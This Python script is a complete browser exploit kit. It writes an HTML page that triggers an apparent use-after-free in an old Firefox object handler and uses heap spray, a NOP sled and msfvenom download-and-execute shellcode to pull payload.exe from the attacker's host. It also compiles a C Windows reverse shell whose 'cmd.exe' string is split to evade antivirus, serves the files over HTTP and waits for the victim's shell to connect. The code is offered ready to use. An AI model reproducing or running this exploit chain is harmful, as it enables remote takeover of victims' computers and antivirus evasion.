#!/usr/bin/python

"""
To have this work you need:
    *Pwntools - (https://github.com/Gallopsled/pwntools)
    *Window-Tools - SimpleReverseShell (https://github.com/infoskirmish/Window-Tools/tree/master/Simple%20Reverse%20Shell)
It probably needs some tweaking on your end too.
I didn't comment the Python code cuz it's pretty uninteresting and simple.
I commented the javascript which is the heart and soul of the exploit. I might be
wrong in a few of the things, if you notice that, then please let me know. I wasn't
sure about a few things, but it works :D

Have fun. :)
"""


import thread
import SimpleHTTPServer
import SocketServer
import fileinput
from os import system
from sys import argv
from pwn import *


COMPILER_PATH = "/root/Documents/Tools/WindowsTools/Window-Tools/SimpleReverseShell/compile.sh"
REVERSE_SHELL_TEMPLATE = """
/* Windows Reverse Shell
Test under windows 7 with AVG Free Edition.
Author: Ma~Far$ (a.k.a. Yahav N. Hoffmann)
Writen 2016 - Modified 2016
This program is open source you can copy and modify, but please keep author credit!
Made a bit more stealthy by infoskirmish.com - 2017
*/

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;


int main(int argc, char *argv[])
{
	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    	struct hostent *host;
	host = gethostbyname("%s");
	strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi("%d"));
	hax.sin_addr.s_addr =inet_addr(aip_addr);

	WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
	if (WSAGetLastError() == 0) {

		memset(&ini_processo, 0, sizeof(ini_processo));

		ini_processo.cb=sizeof(ini_processo);
		ini_processo.dwFlags=STARTF_USESTDHANDLES;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

		char *myArray[4] = { "cm", "d.e", "x", "e" };
		char command[8] = "";
		snprintf( command, sizeof(command), "%%s%%s%%s%%s", myArray[0], myArray[1], myArray[2], myArray[3]);

		CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		exit(0);
	} else {
		exit(0);
	}
}
"""
HTML_TEMPLATE = """
<html>
    <body>
        <object id="obj"></object>
        <script>
            var obj = document.getElementById("obj");
            obj.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null, new Object, 0);  // Garbage collected.

            // Once that object becomes garbage collected, the mChannel pointer will be a dangling pointer.

            // Trigger the vulnerability in 50ms.
            setTimeout(function () {
               // Calls LoadObject() which checks to see if mChannel is non null (true) then invokes a function call on it.
               // This triggers our exploit.
               obj.data = window.location;
            }, 50);  // Damn, that's fast. ;)

            var vtable = unescape("\x00%%u0410");  // I assume the old vtable pointer was freed, and so by allocating a 2 byte string, we can take its place
            var retaddr = unescape("%%uc370%%u0444");  // Return address into our shellcode (0x0444c370)
            while (retaddr.length < 0x100000) {  // Spray 1, getting a reliable place to get our return address.
                retaddr += retaddr;
            }

            var spray1 = new Array();
            for (i = 0; i < 0x80; i++) {
                spray1[i] = new String(retaddr);
            }

            var nopsled = unescape("%%u9090%%u9090");  // Making a massive nopsled.
            while (nopsled.length < 0x1000) {
                nopsled += nopsled;
            }

            // Shellcode. This exploit script will insert windows/download_exec from metasploit.
            var shellcode = unescape("%s");

            var bomb = nopsled + shellcode;
            while (bomb.length < 0x100000) {  // The actual spray that gets executed. Contains our shellcode
                bomb += bomb;
            }

            var spray2 = new Array();
            for (i = 0; i < 0x80; i++) {
                spray2[i] = new String(bomb);
            }
        </script>
    </body>
</html>
"""


class MyHTTPServer(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def __init__(self, request, client_address, server):
        SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self, request, client_address, server)

    def log_request(self, _):
        return None

    def log_error(self, _, __, ___):
        return None


def serve_http(ip, p):
    handler = MyHTTPServer
    httpd = SocketServer.TCPServer((ip, 80), handler)
    p.success("Done")
    httpd.serve_forever()


def gen_html(shellcode):
    html = HTML_TEMPLATE % shellcode

    with open("index.html", "w+") as _file:
        _file.write(html)


def unicodify(text):
    """
    Code stolen from Tim (master131)
    """
    p = text.split('\\x')[1:]
    final = ""
    for k in range(0, len(p), 2):
        final += '%u' + (p[k + 1].zfill(2) if k + 1 < len(p) else '00') + p[k].zfill(2)

    return final


def gen_shellcode(ip):
    system("msfvenom -p windows/download_exec URL=\"http://%s/payload.exe\" EXE=\"payload.exe\" -f c -o shellcode.txt 2> /dev/null" % ip)

    shellcode = ""
    _file = fileinput.input("shellcode.txt")

    next(_file)  # Ignore the first line.

    for line in _file:
        shellcode += line.strip("\"\n;")

    _file.close()

    return unicodify(shellcode)


def gen_rev_shell(ip, port):
    contents = REVERSE_SHELL_TEMPLATE % (ip, port)

    with open("payload.c", "w+") as _file:
        _file.write(contents)

    system(COMPILER_PATH + " payload")


def main():
    if len(argv) < 3:
        print "Pass more args..."
        print "Usage ./exploit.py <lhost> <lport>"
        exit(1)

    ip_addr = argv[1]
    port = int(argv[2])

    p = log.progress("Creating and compiling reverse shell")
    gen_rev_shell(ip_addr, port)
    p.success("Done")

    p = log.progress("Generating shellcode")
    shellcode = gen_shellcode(ip_addr)
    p.success("Done")

    p = log.progress("Creating index.html")
    gen_html(shellcode)
    p.success("Done")

    p = log.progress("Starting HTTP server on port 80")
    thread.start_new_thread(serve_http, (ip_addr, p))

    listener = listen(port, ip_addr)
    listener.wait_for_connection()
    listener.interactive("")


if __name__ == "__main__":
    main()

